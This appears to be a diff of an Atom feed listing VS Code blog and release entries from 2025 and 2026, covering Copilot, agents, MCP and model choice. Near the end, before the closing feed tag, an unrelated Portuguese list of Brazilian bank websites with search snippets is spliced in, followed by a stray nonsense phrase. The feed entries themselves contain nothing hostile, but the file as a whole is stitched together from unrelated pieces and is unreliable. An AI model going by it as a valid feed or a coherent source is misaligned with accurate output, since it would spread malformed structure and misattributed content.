+</author>
+</entry>
+<entry>
+<title>Visual Studio Code 1.131</title>
+<link href="https://code.visualstudio.com/updates/v1_131"/>
+<link rel="related" href="https://code.visualstudio.com/assets/updates/1_131/release-highlights.webp"/>
+<updated>2026-07-29T17:00:00.000Z</updated>
+<id>https://code.visualstudio.com/updates/v1_131</id>
+<category term="release"/>
+<content type="html"> <p>Learn what's new in Visual Studio Code 1.131</p> <p><a href="https://code.visualstudio.com/updates/v1_131">Read the full article</a></p> </content>
+<author>
+<name>Visual Studio Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>MAI-Code-1-Flash: early results from real developer workflows</title>
+<link href="https://code.visualstudio.com/blogs/2026/07/29/mai-code-1-flash"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/07/29/mai-code-1-flash-comparison.webp"/>
+<updated>2026-07-29T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/07/29/mai-code-1-flash</id>
+<category term="blog"/>
+<content type="html"> <p>MAI-Code-1-Flash is a lightweight coding model purpose built for the fast, iterative work developers do every day in GitHub. In this post, we share what the data is telling us about how it performs in real developer workflows.</p> <p><a href="https://code.visualstudio.com/blogs/2026/07/29/mai-code-1-flash">Read the full article</a></p> </content>
+<author>
+<name>Faith Xu</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>How Prompt Tuning Improved GPT-5.5 in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2026/07/06/optimizing-vscode-coding-harness-model-providers"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/07/06/gpt55-metrics-comparison.webp"/>
+<updated>2026-07-06T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/07/06/optimizing-vscode-coding-harness-model-providers</id>
+<category term="blog"/>
+<content type="html"> <p>See how VS Code and OpenAI tested GPT-5.5 system prompt changes in a two-week experiment, cutting tool calls and tail-end token usage while speeding up edits.</p> <p><a href="https://code.visualstudio.com/blogs/2026/07/06/optimizing-vscode-coding-harness-model-providers">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Iterating faster with TypeScript 7</title>
+<link href="https://code.visualstudio.com/blogs/2026/06/26/iterating-faster-with-ts-7"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/06/26/ts-7.webp"/>
+<updated>2026-06-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/06/26/iterating-faster-with-ts-7</id>
+<category term="blog"/>
+<content type="html"> <p>How the VS Code and TypeScript teams collaborated to adopt TypeScript 7 and speed up VS Code development</p> <p><a href="https://code.visualstudio.com/blogs/2026/06/26/iterating-faster-with-ts-7">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>What 50,000 Runs of a 5-Line Eval Taught Us</title>
+<link href="https://code.visualstudio.com/blogs/2026/06/19/what-50000-runs-taught-us"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/06/19/5000-runs-social.webp"/>
+<updated>2026-06-19T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/06/19/what-50000-runs-taught-us</id>
+<category term="blog"/>
+<content type="html"> <p>How AI coding models calibrate effort, token cost, and tool use on even the simplest task, and what that means for model selection and cost.</p> <p><a href="https://code.visualstudio.com/blogs/2026/06/19/what-50000-runs-taught-us">Read the full article</a></p> </content>
+<author>
+<name>Julia Kasper</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Use your own language model key in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2026/06/18/byok-vscode"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/06/18/language-models-editor.webp"/>
+<updated>2026-06-18T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/06/18/byok-vscode</id>
+<category term="blog"/>
+<content type="html"> <p>Learn how to use bring your own key (BYOK) in VS Code to add models from providers like Azure, Anthropic, Gemini, OpenAI, Huggingface, OpenRouter, or use a local model with Ollama, Foundry Local, and more.</p> <p><a href="https://code.visualstudio.com/blogs/2026/06/18/byok-vscode">Read the full article</a></p> </content>
+<author>
+<name>Kayla Cinnamon</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Improving token efficiency for GitHub Copilot in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2026/06/17/improving-token-efficiency-in-github-copilot"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/06/17/cache-explorer.webp"/>
+<updated>2026-06-17T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/06/17/improving-token-efficiency-in-github-copilot</id>
+<category term="blog"/>
+<content type="html"> <p>Learn how we're improving token efficiency for GitHub Copilot to reduce costs and latency for VS Code users.</p> <p><a href="https://code.visualstudio.com/blogs/2026/06/17/improving-token-efficiency-in-github-copilot">Read the full article</a></p> </content>
+<author>
+<name>Ryan Caldwell, Bhavya U</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>The Coding Harness Behind GitHub Copilot in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2026/05/15/agent-harnesses-github-copilot-vscode"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/05/15/evaluations.webp"/>
+<updated>2026-05-15T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/05/15/agent-harnesses-github-copilot-vscode</id>
+<category term="blog"/>
+<content type="html"> <p>Learn why the coding harness around GitHub Copilot in VS Code matters as models, tools, agents, and providers evolve.</p> <p><a href="https://code.visualstudio.com/blogs/2026/05/15/agent-harnesses-github-copilot-vscode">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>How VS Code Builds with AI</title>
+<link href="https://code.visualstudio.com/blogs/2026/03/13/how-VS-Code-Builds-with-AI"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/03/13/weekly-releases-x.webp"/>
+<updated>2026-03-13T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/03/13/how-VS-Code-Builds-with-AI</id>
+<category term="blog"/>
+<content type="html"> <p>Learn how VS Code uses AI across its own development workflow with GitHub Copilot agent mode, automated testing, and AI-powered code review.</p> <p><a href="https://code.visualstudio.com/blogs/2026/03/13/how-VS-Code-Builds-with-AI">Read the full article</a></p> </content>
+<author>
+<name>Pierce Boggan</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Making agents practical for real-world development</title>
+<link href="https://code.visualstudio.com/blogs/2026/03/05/making-agents-practical-for-real-world-development"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/03/05/release-graphic.webp"/>
+<updated>2026-03-05T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/03/05/making-agents-practical-for-real-world-development</id>
+<category term="blog"/>
+<content type="html"> <p>Explore agent orchestration, extensibility, and continuity in VS Code 1.110: lifecycle hooks, agent skills, session memory, and integrated browser tools.</p> <p><a href="https://code.visualstudio.com/blogs/2026/03/05/making-agents-practical-for-real-world-development">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Building Long-Distance Next Edit Suggestions</title>
+<link href="https://code.visualstudio.com/blogs/2026/02/26/long-distance-nes"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/02/26/long-distance-nes-hero.webp"/>
+<updated>2026-02-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/02/26/long-distance-nes</id>
+<category term="blog"/>
+<content type="html"> <p>Learn how we extended next edit suggestions to work across your entire file, reducing friction and improving productivity in GitHub Copilot.</p> <p><a href="https://code.visualstudio.com/blogs/2026/02/26/long-distance-nes">Read the full article</a></p> </content>
+<author>
+<name>Vikram Duvvur, Gaurav Mittal, Benjamin Simmonds</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Your Home for Multi-Agent Development</title>
+<link href="https://code.visualstudio.com/blogs/2026/02/05/multi-agent-development"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/02/05/your-agent-ux.webp"/>
+<updated>2026-02-05T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/02/05/multi-agent-development</id>
+<category term="blog"/>
+<content type="html"> <p>VS Code has become the unified interface for all your coding agents. Manage local, background, and cloud agents in one place, use Claude and Codex agents alongside Copilot, and benefit from open standards like MCP and Agent Skills.</p> <p><a href="https://code.visualstudio.com/blogs/2026/02/05/multi-agent-development">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Giving Agents a Visual Voice: MCP Apps Support in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2026/01/26/mcp-apps-support"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/01/26/mcp-apps-list-sort.webp"/>
+<updated>2026-01-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/01/26/mcp-apps-support</id>
+<category term="blog"/>
+<content type="html"> <p>VS Code now supports MCP Apps, enabling AI agents to display interactive UIs for richer developer workflows.</p> <p><a href="https://code.visualstudio.com/blogs/2026/01/26/mcp-apps-support">Read the full article</a></p> </content>
+<author>
+<name>Harald Kirschner, Connor Peet</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Building docfind: Fast Client-Side Search with Rust and WebAssembly</title>
+<link href="https://code.visualstudio.com/blogs/2026/01/15/docfind"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2026/01/15/docfind-social.webp"/>
+<updated>2026-01-15T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2026/01/15/docfind</id>
+<category term="blog"/>
+<content type="html"> <p>How we built docfind, a high-performance client-side search engine using Rust and WebAssembly, and how GitHub Copilot accelerated development.</p> <p><a href="https://code.visualstudio.com/blogs/2026/01/15/docfind">Read the full article</a></p> </content>
+<author>
+<name>João Moreno</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Introducing the VS Code Insiders Podcast</title>
+<link href="https://code.visualstudio.com/blogs/2025/12/03/introducing-vs-code-insiders-podcast"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/12/03/hero-vscode-podcast.webp"/>
+<updated>2025-12-03T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/12/03/introducing-vs-code-insiders-podcast</id>
+<category term="blog"/>
+<content type="html"> <p>The VS Code Insiders Podcast is your insider's guide to the features, decisions, and people shaping the future of Visual Studio Code.</p> <p><a href="https://code.visualstudio.com/blogs/2025/12/03/introducing-vs-code-insiders-podcast">Read the full article</a></p> </content>
+<author>
+<name>James Montemagno</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Introducing the Visual Studio Code Private Marketplace: Your Team's Secure, Curated Extension Hub 🎉</title>
+<link href="https://code.visualstudio.com/blogs/2025/11/18/PrivateMarketplace"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/11/18/PrivateMarketplaceHero.webp"/>
+<updated>2025-11-18T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/11/18/PrivateMarketplace</id>
+<category term="blog"/>
+<content type="html"> <p>Private Marketplace for VS Code extensions now generally available.</p> <p><a href="https://code.visualstudio.com/blogs/2025/11/18/PrivateMarketplace">Read the full article</a></p> </content>
+<author>
+<name>Sean Iyer</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Open Source AI Editor: Second Milestone</title>
+<link href="https://code.visualstudio.com/blogs/2025/11/04/openSourceAIEditorSecondMilestone"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/11/04/copilot-oct-pr.webp"/>
+<updated>2025-11-06T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/11/04/openSourceAIEditorSecondMilestone</id>
+<category term="blog"/>
+<content type="html"> <p>Ghost text suggestions are now open source as part of the Copilot Chat extension - the second milestone in making VS Code an open source AI editor.</p> <p><a href="https://code.visualstudio.com/blogs/2025/11/04/openSourceAIEditorSecondMilestone">Read the full article</a></p> </content>
+<author>
+<name>The VS Code team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>A Unified Experience for all Coding Agents</title>
+<link href="https://code.visualstudio.com/blogs/2025/11/03/unified-agent-experience"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/11/03/unified-agent-experience.webp"/>
+<updated>2025-11-05T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/11/03/unified-agent-experience</id>
+<category term="blog"/>
+<content type="html"> <p>Agents took over VS Code in 2025. We released agent mode for VS Code, integration for the Copilot coding agent, and the new GitHub Copilot CLI. But Copilot is not the only agent game in town. There are now more coding agents than ever, including options from OpenAI and Anthropic.</p> <p><a href="https://code.visualstudio.com/blogs/2025/11/03/unified-agent-experience">Read the full article</a></p> </content>
+<author>
+<name>VS Code Team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Expanding Model Choice in VS Code with Bring Your Own Key</title>
+<link href="https://code.visualstudio.com/blogs/2025/10/22/bring-your-own-key"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/10/22/expanding-model-choice.webp"/>
+<updated>2025-10-22T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/10/22/bring-your-own-key</id>
+<category term="blog"/>
+<content type="html"> <p>Learn how the new Language Model Chat Provider API in VS Code is enabling more model choice and extensibility for chat experiences via the Bring Your Own Key experience.</p> <p><a href="https://code.visualstudio.com/blogs/2025/10/22/bring-your-own-key">Read the full article</a></p> </content>
+<author>
+<name>Olivia Guzzardo McVicker, Pierce Boggan</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Introducing auto model selection (preview)</title>
+<link href="https://code.visualstudio.com/blogs/2025/09/15/autoModelSelection"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/09/15/autoDropdown.webp"/>
+<updated>2025-09-15T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/09/15/autoModelSelection</id>
+<category term="blog"/>
+<content type="html"> <p>Use auto model selection in VS Code to get faster responses, reduced rate limiting, and a 10% discount on premium requests for paid users.</p> <p><a href="https://code.visualstudio.com/blogs/2025/09/15/autoModelSelection">Read the full article</a></p> </content>
+<author>
+<name>Isidor Nikolic</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Command GitHub's Coding Agent from VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2025/07/17/copilot-coding-agent"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/07/17/copilot-wip.webp"/>
+<updated>2025-07-17T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/07/17/copilot-coding-agent</id>
+<category term="blog"/>
+<content type="html"> <p>VS Code's integration with GitHub Copilot Coding Agent allows you to delegate tasks to the agent and let it handle them in the background.</p> <p><a href="https://code.visualstudio.com/blogs/2025/07/17/copilot-coding-agent">Read the full article</a></p> </content>
+<author>
+<name>Burke Holland</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Open Source AI Editor: First Milestone</title>
+<link href="https://code.visualstudio.com/blogs/2025/06/30/openSourceAIEditorFirstMilestone"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/06/30/open_source_ai_editor.webp"/>
+<updated>2025-06-30T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/06/30/openSourceAIEditorFirstMilestone</id>
+<category term="blog"/>
+<content type="html"> <p>We are open sourcing the GitHub Copilot Chat extension. It’s the first milestone in making VS Code an open source AI editor.</p> <p><a href="https://code.visualstudio.com/blogs/2025/06/30/openSourceAIEditorFirstMilestone">Read the full article</a></p> </content>
+<author>
+<name>The VS Code team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>The Complete MCP Experience: Full Specification Support in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2025/06/12/full-mcp-spec-support"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/06/12/mcp-resources-context.webp"/>
+<updated>2025-06-12T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/06/12/full-mcp-spec-support</id>
+<category term="blog"/>
+<content type="html"> <p>VS Code now supports the complete Model Context Protocol specification, including authorization, prompts, resources, and sampling.</p> <p><a href="https://code.visualstudio.com/blogs/2025/06/12/full-mcp-spec-support">Read the full article</a></p> </content>
+<author>
+<name>Harald Kirschner</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Enhance productivity with AI + Remote Dev</title>
+<link href="https://code.visualstudio.com/blogs/2025/05/27/ai-and-remote"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/05/27/ai-remote-development-social.webp"/>
+<updated>2025-05-27T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/05/27/ai-and-remote</id>
+<category term="blog"/>
+<content type="html"> <p>Enhance your developer productivity with AI and Remote Development.</p> <p><a href="https://code.visualstudio.com/blogs/2025/05/27/ai-and-remote">Read the full article</a></p> </content>
+<author>
+<name>Brigit Murtaugh, Christof Marti, Josh Spicer, Olivia Guzzardo McVicker</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>VS Code: Open Source AI Editor</title>
+<link href="https://code.visualstudio.com/blogs/2025/05/19/openSourceAIEditor"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/05/19/open_source_ai_editor.webp"/>
+<updated>2025-05-19T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/05/19/openSourceAIEditor</id>
+<category term="blog"/>
+<content type="html"> <p>We will open source the GitHub Copilot Chat extension. It’s the next step towards making VS Code an open source AI editor.</p> <p><a href="https://code.visualstudio.com/blogs/2025/05/19/openSourceAIEditor">Read the full article</a></p> </content>
+<author>
+<name>The VS Code team</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Beyond the tools, adding MCP in VS Code</title>
+<link href="https://code.visualstudio.com/blogs/2025/05/12/agent-mode-meets-mcp"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/05/12/agent-mcp-tools.webp"/>
+<updated>2025-05-14T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/05/12/agent-mode-meets-mcp</id>
+<category term="blog"/>
+<content type="html"> <p>Bring your own tools to VS Code's agent mode with MCP.</p> <p><a href="https://code.visualstudio.com/blogs/2025/05/12/agent-mode-meets-mcp">Read the full article</a></p> </content>
+<author>
+<name>Harald Kirschner</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>
+<entry>
+<title>Context is all you need: Better AI results with custom instructions</title>
+<link href="https://code.visualstudio.com/blogs/2025/03/26/custom-instructions"/>
+<link rel="related" href="https://code.visualstudio.com/assets/blogs/2025/03/26/tail-recursion.jpg"/>
+<updated>2025-03-26T00:00:00.000Z</updated>
+<id>https://code.visualstudio.com/blogs/2025/03/26/custom-instructions</id>
+<category term="blog"/>
+<content type="html"> <p>Announcing the general availability of custom instructions for VS Code.</p> <p><a href="https://code.visualstudio.com/blogs/2025/03/26/custom-instructions">Read the full article</a></p> </content>
+<author>
+<name>Rob Conery, Harald Kirschner</name>
+<uri>https://code.visualstudio.com/branding/code-stable.png</uri>
+</author>
+</entry>Confira os sites oficiais dos principais bancos tradicionais e digitais do Brasil:
+
+Bancos Tradicionais
+
+• Banco do Brasil – Banco do Brasil
+• Caixa Econômica Federal – CAIXA
+• Banco do Nordeste – Banco do Nordeste
+• Banco Original – Banco Original
+• Banco BRB – Banco BRB
+• Banco ABC Brasil – Banco ABC Brasil
+
+Bancos Digitais e Plataformas
+
+• C6 Bank – C6 Bank
+• Next – next
+• PagBank – PagBank
+
+Consultas Oficiais
+
+• Para verificar se uma instituição financeira é autorizada, regulada ou supervisionada pelo governo, acesse o portal do Banco Central do Brasil.
+Você está procurando por um serviço específico (como abertura de conta, empréstimo, cartão de crédito ou investimentos) ou deseja o site de algum outro banco em particular?
+Banco do Nordeste
+Banco do Nordeste - Acesso à conta, crédito e serviços financeiros - Portal ...
+Acesse sua conta e conheça, de forma simples, os serviços do Banco do Nordeste. Veja opções de crédito, investimentos, apoio a negócios e canais de atendimento ...
+Banco do Brasil
+Pra Você | Banco do Brasil
+Banco do Brasil services/features: * Cantor João Gomes: BB me resolve. * Move Brasil Táxi e Motoristas: crédito para modernização de veículos. * Seguro Proteção...
+Banco Central do Brasil
+Encontre uma instituição regulada/supervisionada pelo BC
+30 de out. de 2026 — Encontre uma instituição regulada/supervisionada pelo BC. Nesta página, você encontra a lista de instituições autorizadas, reguladas ou supervisionadas pelo Ban...
+CAIXA
+CAIXA
+Acesso Rápido. Conectividade Social · Abrir conta · Negociação de Dívidas · Habitação. Comprar, construir ou reformar sua casa nova pode ser mais simples do que...
+Banco Original
+Banco Original
+Um banco completo com soluções para todos os seus negócios. Há mais de 10 anos atuando no segmento Corporate, Agronegócio e Middle, o Original, braço financeiro...
+Banco ABC Brasil
+Banco ABC Brasil
+Banco ABC Brasil: financial solutions provider in São Paulo. Services for companies: - Gestão financeira: multidisciplinary team for business growth. - Investme...
+Banco BRB
+Banco BRB
+Banco BRB offerings: - Individual (Para você): BRB Investimentos, debt renegotiation (Renegociação de dívida), Crédito Imobiliário, digital account opening via ...
+C6 Bank
+C6 Bank: Banco completo no Brasil e no mundo
+* C6 Bank: sociedade com JPMorganChase. * Lucro líquido: R$ 1,3 bi no 1º Sem. de 2026. * Cartões e pontos: C6 Carbon (até 3,5 pts/US$ 1), C6 Black (até 2,5 pts/
+Conta Digital - next
+Conta Digital - next
+next: conta 100% digital, sem taxas ou manutenção. nextJoy: conta digital para crianças e adolescentes. Serviços e produtos: - Pix, cartões de débito/crédito se...
+PagBank
+Conta Digital PagBank grátis com limite garantido no Cartão de Crédito
+* Conta Digital/PJ PagBank: Grátis c/movimentação em 360d (senão R$ 75,00/mês). * TED, Pix, extrato, saques Banco24Horas: Grátis. * Cartão de crédito: Sem anuid...
+    
+</feed> trilhões de dolares em livros infinitos 
